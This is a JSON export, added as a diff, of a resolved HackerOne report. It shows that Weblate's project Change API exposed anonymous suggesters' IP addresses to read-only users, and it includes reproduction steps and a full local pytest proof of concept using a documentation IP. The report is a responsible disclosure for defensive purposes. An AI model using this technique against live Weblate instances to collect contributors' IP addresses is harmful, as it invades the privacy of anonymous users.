@@ -1,0 +1,131 @@
+{
+  "id": 4117330,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTE3MzMw",
+  "url": "https://hackerone.com/reports/4117330",
+  "title": "Anonymous Translation Suggestion IP Address Exposure Through Change API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-10-15T17:48:41.302Z",
+  "submitted_at": "2026-10-15T17:48:41.540Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "4upasta",
+    "url": "/4upasta",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9jc7odp146wnj08h7vr0yth3npi1/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-15T06:57:14.618Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-16T06:57:11.323Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nI found that the IP address associated with an anonymous translation suggestion can be exposed through the Change API to an authenticated user with read-only access to the project.\nDuring local dynamic testing, I submitted an anonymous translation suggestion using synthetic data. The IP address was stored in Change.details.ip_address and returned by the Change API to a separate test account that had project read access but no editing permissions.\nHowever, the same IP address was not displayed in the regular change-history page.\nThis behavior was reproduced locally against commit 5b328473a12d06dac172f9bd90f3ebeb3edef1f6.\n##poc\n\nSteps to Reproduce\n\nStep 1 — Prepare the Weblate Test Environment\n\nI tested the issue against the local Weblate source at commit:\n\n5b328473a12d06dac172f9bd90f3ebeb3edef1f6\n\nThe environment used Django's test settings and a local PostgreSQL instance. No live Weblate server was contacted.\n\nI configured PostgreSQL for the test runner using a temporary local database role named ubuntu, with LOGIN and CREATEDB privileges only. The role did not have superuser privileges.\n\nI then ran the test using the following command:\n```\nCI_DB_USER=ubuntu DJANGO_SETTINGS_MODULE=weblate.settings_test \\\nuv run --offline --no-sync pytest -v -s \\\n/workspace/weblate-review/poc/test_anonymous_suggestion_ip_exposure.py\n```\nPytest created a temporary test database and applied the required migrations.\n\nStep 2 — Create a Read-Only Project Account\n\nI created a synthetic account named poc_read_only_reader and granted it access to a public test project through a group with no assigned roles.\n\nThe test verified that the account could access the project but could not edit the project, manage its permissions, or edit translation units.\n\nThe relevant permission checks were:\n```\nself.assertTrue(reader.can_access_project(self.project))\nself.assertEqual(reader_group.roles.count(), 0)\n\nself.assertFalse(reader.has_perm(\"project.edit\", self.project))\nself.assertFalse(\n    reader.has_perm(\"project.permissions\", self.project)\n)\nself.assertFalse(reader.has_perm(\"unit.edit\", unit))\n```\nThis established the intended test condition: an authenticated reader with project visibility but without editing permissions.\n\nStep 3 — Submit an Anonymous Translation Suggestion\n\nI logged out the test client and submitted a synthetic translation suggestion through Weblate's regular translation interface.\n\nFor this test, I used the reserved documentation IP address 192.0.2.10 rather than a real user's IP address.\n\nThe request was submitted with:\n```\nsubmit = self.client.post(\n    search_url,\n    form_data,\n    REMOTE_ADDR=\"192.0.2.10\",\n    HTTP_USER_AGENT=\"Cue-local-PoC/1.0\",\n)\n```\nThe submission returned HTTP 302.\n\nI then retrieved the corresponding suggestion and change records and verified that the IP address had been stored in the change details:\n```\nsuggestion = Suggestion.objects.get(\n    unit=unit,\n    target=POC_SUGGESTION,\n)\n\nchange = Change.objects.get(\n    action=ActionEvents.SUGGESTION,\n    suggestion=suggestion,\n)\n\nself.assertEqual(\n    change.details.get(\"ip_address\"),\n    \"192.0.2.10\",\n)\n```\nResult: The anonymous suggestion was created, and its associated change record contained the synthetic IP address.\n\nStep 4 — Retrieve the Change Through the Project Changes API\n\nI authenticated a Django REST Framework APIClient as the read-only account and requested the first page of the project's changes API.\n\nThe relevant test code was:\n```\napi_client = APIClient()\napi_client.force_authenticate(user=reader)\n\napi_response = api_client.get(\n    reverse(\n        \"api:project-changes\",\n        kwargs={\"slug\": self.project.slug},\n    ),\n    {\"page\": 1},\n)\n\nself.assertEqual(api_response.status_code, 200)\n```\nThe test then located the specific change record in the API response and checked its details.ip_address field:\n```\napi_record = next(\n    (\n        item\n        for item in api_response.data[\"results\"]\n        if item[\"id\"] == change.pk\n    ),\n    None,\n)\n\nself.assertIsNotNone(api_record)\n\nself.assertEqual(\n    api_record[\"details\"].get(\"ip_address\"),\n    \"192.0.2.10\",\n)\n```\nActual result: The API returned HTTP 200 and included the synthetic IP address in the change record, even though the authenticated account had no project-editing permissions.\n\nStep 5 — Compare the Regular Change-History Page\n\nTo determine whether the same information was displayed in the regular web interface, I requested the project's change-history page using the same read-only account.\n\nThe test code was:\n```\nhtml_client = Client()\nhtml_client.force_login(reader)\n\nhtml_response = html_client.get(\n    reverse(\n        \"changes\",\n        kwargs={\"path\": self.project.get_url_path()},\n    )\n)\n\nself.assertEqual(html_response.status_code, 200)\n\nself.assertNotIn(\n    b\"192.0.2.10\",\n    html_response.content,\n)\n```\nActual result: The page returned HTTP 200, but its HTML response did not contain the synthetic IP address.\n\nThis demonstrated a difference between the API response and the regular change-history page for the same test account and change record.\n\nStep 6 — Verify the Test Evidence\n\nAfter correcting the test's permission-result handling, I reran the test.\n\nThe final result was:\n\n1 passed\n\nThe test generated poc-evidence.json, which recorded the relevant results:\n```\n{\n  \"result\": \"confirmed_in_local_test\",\n  \"target_commit\": \"5b328473a12d06dac172f9bd90f3ebeb3edef1f6\",\n  \"synthetic_ip\": \"192.0.2.10\",\n  \"reader\": {\n    \"can_access_project\": true,\n    \"has_any_group_roles\": false,\n    \"project_edit\": false,\n    \"project_permissions\": false,\n    \"unit_edit\": false,\n    \"superuser\": false\n  },\n  \"api\": {\n    \"status\": 200,\n    \"details_ip_address\": \"192.0.2.10\"\n  },\n  \"html\": {\n    \"status\": 200,\n    \"contains_synthetic_ip\": false\n  },\n  \"no_live_host_contacted\": true,\n  \"no_configured_credentials_used\": true\n}\n```\nStep 7 — Clean Up the Test Environment\n\nAfter the successful test run:\n\nPytest removed the temporary test database.\n\nI dropped the temporary PostgreSQL role created for the test.\n\nThe local PostgreSQL service remained online.\n\nNo live Weblate server, production database, real user IP address, or configured credentials were used.\n\n\nImportant Testing Limitation\n\nThe API request used DRF's in-process APIClient.force_authenticate. This exercised the API view, permission checks, serializer, and response data, but did not test session or token authentication over a network connection.\n\nThe results therefore confirm the behavior in the local source at the specified commit. I have not verified whether the same behavior is present in a live deployment.\nFull Code\n```\n\nfrom __future__ import annotations\n\nimport json\nfrom pathlib import Path\nfrom urllib.parse import urlencode\n\nfrom django.test import Client\nfrom django.urls import reverse\nfrom rest_framework.test import APIClient\n\nfrom weblate.api.tests import APIBaseTest\nfrom weblate.auth.data import SELECTION_ALL, SELECTION_ALL_PUBLIC\nfrom weblate.auth.models import Group, User\nfrom weblate.trans.actions import ActionEvents\nfrom weblate.trans.models import Change, Project, Suggestion, Unit\nfrom weblate.utils.hash import hash_to_checksum\n\nPOC_IP = \"192.0.2.10\"  # TEST-NET-1; reserved for documentation.\nPOC_SUGGESTION = \"Welcome to the isolated Weblate PoC project\\n\"\nPOC_READER_USERNAME = \"poc_read_only_reader\"\n\n\nclass TestAnonymousSuggestionIPExposurePoC(APIBaseTest):\n    \"\"\"Exercise the anonymous-submit -> reader API -> HTML comparison flow.\"\"\"\n\n    def test_reader_api_exposes_anonymous_suggestion_ip_but_html_hides_it(self) -> None:\n        # Make the fixture project explicitly public and suggestions enabled.\n        self.project.access_control = Project.ACCESS_PUBLIC\n        self.project.save(update_fields=[\"access_control\"])\n        self.component.enable_suggestions = True\n        self.component.save(update_fields=[\"enable_suggestions\"])\n\n        unit = Unit.objects.get(\n            translation__component=self.component,\n            translation__language_code=\"cs\",\n            source=\"Hello, world!\\n\",\n        )\n\n        # Account B has project visibility only: its group has no roles.\n        reader_group = Group.objects.create(\n            name=\"PoC public read-only readers\",\n            project_selection=SELECTION_ALL_PUBLIC,\n            language_selection=SELECTION_ALL,\n        )\n        reader = User.objects.create_user(\n            username=POC_READER_USERNAME,\n            email=\"poc-reader@example.invalid\",\n            is_superuser=False,\n        )\n        reader.groups.set([reader_group])\n        reader.clear_permissions_cache()\n\n        self.assertTrue(reader.is_authenticated)\n        self.assertFalse(reader.is_superuser)\n        self.assertTrue(reader.can_access_project(self.project))\n        self.assertEqual(reader_group.roles.count(), 0)\n        self.assertFalse(reader.has_perm(\"project.edit\", self.project))\n        self.assertFalse(reader.has_perm(\"project.permissions\", self.project))\n        self.assertFalse(reader.has_perm(\"unit.edit\", unit))\n\n        # Submit through the regular translation UI while logged out.\n        self.client.logout()\n        translate_url = unit.translation.get_translate_url()\n        search_url = f\"{translate_url}?{urlencode({'q': unit.source})}\"\n        page = self.client.get(search_url)\n        self.assertEqual(page.status_code, 200)\n\n        form_data = {\n            \"unit_id\": str(unit.pk),\n            \"checksum\": unit.checksum,\n            \"contentsum\": hash_to_checksum(unit.content_hash),\n            \"translationsum\": hash_to_checksum(unit.get_target_hash()),\n            \"target_0\": POC_SUGGESTION,\n            \"review\": \"20\",\n            \"suggest\": \"yes\",\n            \"save-stay\": \"1\",\n            \"q\": unit.source,\n        }\n        submit = self.client.post(\n            search_url,\n            form_data,\n            REMOTE_ADDR=POC_IP,\n            HTTP_USER_AGENT=\"Cue-local-PoC/1.0\",\n        )\n        self.assertEqual(\n            submit.status_code,\n            302,\n            submit.content.decode(errors=\"replace\"),\n        )\n\n        suggestion = Suggestion.objects.get(unit=unit, target=POC_SUGGESTION)\n        change = Change.objects.get(\n            action=ActionEvents.SUGGESTION,\n            suggestion=suggestion,\n        )\n        self.assertEqual(change.details.get(\"ip_address\"), POC_IP)\n\n        # Authenticate the API request as Account B in-process; no token/cookie\n        # value is read, printed, or saved.\n        api_client = APIClient()\n        api_client.force_authenticate(user=reader)\n        api_response = api_client.get(\n            reverse(\"api:project-changes\", kwargs={\"slug\": self.project.slug}),\n            {\"page\": 1},\n        )\n        self.assertEqual(\n            api_response.status_code,\n            200,\n            api_response.content.decode(errors=\"replace\"),\n        )\n        api_record = next(\n            (\n                item\n                for item in api_response.data[\"results\"]\n                if item[\"id\"] == change.pk\n            ),\n            None,\n        )\n        self.assertIsNotNone(\n            api_record,\n            \"reader API response omitted the new suggestion change\",\n        )\n        self.assertEqual(api_record[\"details\"].get(\"ip_address\"), POC_IP)\n\n        # Compare the project change-history HTML for the same reader.\n        html_client = Client()\n        html_client.force_login(reader)\n        html_response = html_client.get(\n            reverse(\"changes\", kwargs={\"path\": self.project.get_url_path()})\n        )\n        self.assertEqual(html_response.status_code, 200)\n        self.assertNotIn(POC_IP.encode(), html_response.content)\n\n        evidence = {\n            \"result\": \"confirmed_in_local_test\",\n            \"target_commit\": \"5b328473a12d06dac172f9bd90f3ebeb3edef1f6\",\n            \"test_project\": self.project.slug,\n            \"submission\": \"anonymous translation-UI POST\",\n            \"synthetic_ip\": POC_IP,\n            \"reader\": {\n                \"username\": POC_READER_USERNAME,\n                \"can_access_project\": True,\n                \"has_any_group_roles\": reader.groups.filter(\n                    roles__isnull=False\n                ).exists(),\n                \"project_edit\": bool(reader.has_perm(\"project.edit\", self.project)),\n                \"project_permissions\": bool(\n                    reader.has_perm(\"project.permissions\", self.project)\n                ),\n                \"unit_edit\": bool(reader.has_perm(\"unit.edit\", unit)),\n                \"superuser\": reader.is_superuser,\n            },\n            \"api\": {\n                \"status\": api_response.status_code,\n                \"change_id\": change.pk,\n                \"details_ip_address\": api_record[\"details\"].get(\"ip_address\"),\n            },\n            \"html\": {\n                \"status\": html_response.status_code,\n                \"contains_synthetic_ip\": POC_IP.encode() in html_response.content,\n            },\n            \"no_live_host_contacted\": True,\n            \"no_configured_credentials_used\": True,\n        }\n        evidence_path = Path(__file__).with_name(\"poc-evidence.json\")\n        evidence_path.write_text(\n            json.dumps(evidence, indent=2) + \"\\n\",\n            encoding=\"utf-8\",\n        )\n        print(\"POC_EVIDENCE=\" + json.dumps(evidence, sort_keys=True))\n```\n\n## Impact\n\n## impact\nIf this behavior is present in deployed instances, users with read access to a project may be able to retrieve IP addresses associated with anonymous translation suggestions through the API, even though these addresses are not displayed in the regular interface.\nThis could expose network-origin information associated with anonymous contributors.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6999039,
+      "file_name": "test_anonymous_suggestion_ip_exposure.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dq2rwi9owuw878fy55mx8gxx8frp?response-content-disposition=attachment%3B%20filename%3D%22test_anonymous_suggestion_ip_exposure.py%22%3B%20filename%2A%3DUTF-8%27%27test_anonymous_suggestion_ip_exposure.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVUPFWGGK%2F20261115%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261115T072631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHpEsjtXMAt%2BcCbKnKmllpewuS0NaioVK61JHyLigjaiAiEAm4DZqrGYsZJcHJEK49HFEhdWjZ5%2BkECEMiAoLifbSdAquwUIsP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBuLvvCP4QXeY9HhnCqPBUJyhX1fHxF1tLOXUQCRUS29b41G%2BDn7JD3gmxwCuoY3%2BL8rIiyJtAYIbve%2B2nLb7L8y89RNrJyaBxjk70lTRSF1fJjx2Lqvg5bMdW2UdQm64aG0lAz4hKyRl7pPP0U%2B1K9ZL4Uczmb0wBdLO5ZNTQ8xgL3NWkltpvJ93SBEKrUmOL9wMS1Mss8%2BxjEextbAeUR6rMklNSnlvZcEM3b57cWjWlOZbcfg%2BrE0R%2F1T0wPtlPLhdfS7h4W9Z%2BFKaXzocDqF2aqhfEKeZSdIY8ofN%2F1Fdcak0ZGNXuBe9JY0cKA7hpNOJEepjIrAc%2BmwfNcIBJbqXnH7xmDz8G17nbhdm2l9FE4bP%2Fc1weuYXYkdMvw8uIJ7PxKp3IiZc%2FQ1yLhSFQ1%2B%2BIN%2FNc%2BOPVqTT11Ch9WGCfMM8xV7%2BVUAEINLRYZ26siaVgFpd%2B85yGcOZ2lj4l8jlZHpfQSOo5YgSIRth%2BpTFtnfS0m24j%2Fz73Oyho3Wuv1NcHxi4w0DcMC3Eoa6iEQTiP0fBkLcO1Jgba%2B62dTnYUojVOgBhWB1ZtlstocT%2BYE59%2Fcyl0evj6qRmE0S4BU4WYZgVJily2nz5kWq9Idu961ituazALURR26osZ3cHzX3UKISI2YbVu4Y57LN7C8aFoGXVkR6kO75JisVAFtBSaUrKA1vaxljMQEgfIQS11Ik7rkCG6C05dxrLRPHXjPbmKbAUGGdj35O3t4JdR6SfQya2vDEpMkxSwxVOHuHfujBidsKOgyn8Wv9kUinFPRCr6iU0k0eMLSt5v0hrK13WAgQmlVZh%2B4LzJUVoqKugVsQSGHzSXETe%2FZ9%2B1a0PKsw8EeMoeoL7sYktWvvkRZ9ZMa3vUL1km1JppESGxIwvKLl1wY6sQGShtBjDyUGUCYv4dDzCK2agApOnDhgIQSFb7byjweGeEziIku3yXq3HGa4NKUpmJDovvwwO87UluFRIh5gz6K1zwF7r6pgRbzL8kSmpNrHYr0%2BTTdegTiJG%2BPy%2BjxtNPvAr%2FctHK0aPhOWK0kgGioJ6GdWjjixPOP7lQpXZO%2BjcVvgetIfcbEbA0tWpHFtBqRywxuJ5vPCFl4Lf69WP0%2Fx%2FEaCz6ao2gUX00zU1b2L%2FD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=796ffe5f18da1c7677e0b20eff12ca9ef88ea03e87b6a0e26440151923962db2",
+      "file_size": 6951,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 6999054,
+      "file_name": "poc-evidence_(1).json",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6uxuqthuyx0cf0xio42twm7284nx?response-content-disposition=attachment%3B%20filename%3D%22poc-evidence_%25281%2529.json%22%3B%20filename%2A%3DUTF-8%27%27poc-evidence_%25281%2529.json&response-content-type=application%2Fjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVUPFWGGK%2F20261115%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261115T072631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHpEsjtXMAt%2BcCbKnKmllpewuS0NaioVK61JHyLigjaiAiEAm4DZqrGYsZJcHJEK49HFEhdWjZ5%2BkECEMiAoLifbSdAquwUIsP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBuLvvCP4QXeY9HhnCqPBUJyhX1fHxF1tLOXUQCRUS29b41G%2BDn7JD3gmxwCuoY3%2BL8rIiyJtAYIbve%2B2nLb7L8y89RNrJyaBxjk70lTRSF1fJjx2Lqvg5bMdW2UdQm64aG0lAz4hKyRl7pPP0U%2B1K9ZL4Uczmb0wBdLO5ZNTQ8xgL3NWkltpvJ93SBEKrUmOL9wMS1Mss8%2BxjEextbAeUR6rMklNSnlvZcEM3b57cWjWlOZbcfg%2BrE0R%2F1T0wPtlPLhdfS7h4W9Z%2BFKaXzocDqF2aqhfEKeZSdIY8ofN%2F1Fdcak0ZGNXuBe9JY0cKA7hpNOJEepjIrAc%2BmwfNcIBJbqXnH7xmDz8G17nbhdm2l9FE4bP%2Fc1weuYXYkdMvw8uIJ7PxKp3IiZc%2FQ1yLhSFQ1%2B%2BIN%2FNc%2BOPVqTT11Ch9WGCfMM8xV7%2BVUAEINLRYZ26siaVgFpd%2B85yGcOZ2lj4l8jlZHpfQSOo5YgSIRth%2BpTFtnfS0m24j%2Fz73Oyho3Wuv1NcHxi4w0DcMC3Eoa6iEQTiP0fBkLcO1Jgba%2B62dTnYUojVOgBhWB1ZtlstocT%2BYE59%2Fcyl0evj6qRmE0S4BU4WYZgVJily2nz5kWq9Idu961ituazALURR26osZ3cHzX3UKISI2YbVu4Y57LN7C8aFoGXVkR6kO75JisVAFtBSaUrKA1vaxljMQEgfIQS11Ik7rkCG6C05dxrLRPHXjPbmKbAUGGdj35O3t4JdR6SfQya2vDEpMkxSwxVOHuHfujBidsKOgyn8Wv9kUinFPRCr6iU0k0eMLSt5v0hrK13WAgQmlVZh%2B4LzJUVoqKugVsQSGHzSXETe%2FZ9%2B1a0PKsw8EeMoeoL7sYktWvvkRZ9ZMa3vUL1km1JppESGxIwvKLl1wY6sQGShtBjDyUGUCYv4dDzCK2agApOnDhgIQSFb7byjweGeEziIku3yXq3HGa4NKUpmJDovvwwO87UluFRIh5gz6K1zwF7r6pgRbzL8kSmpNrHYr0%2BTTdegTiJG%2BPy%2BjxtNPvAr%2FctHK0aPhOWK0kgGioJ6GdWjjixPOP7lQpXZO%2BjcVvgetIfcbEbA0tWpHFtBqRywxuJ5vPCFl4Lf69WP0%2Fx%2FEaCz6ao2gUX00zU1b2L%2FD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2912e8b47286a33507220b7b0d9cf4140e231ff47c2de9e5d4691b75719ce3c7",
+      "file_size": 687,
+      "type": "application/json",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-11-15T06:57:11.454Z",
+  "allow_singular_disclosure_after": -1759.861025439,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 173,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/weblate",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
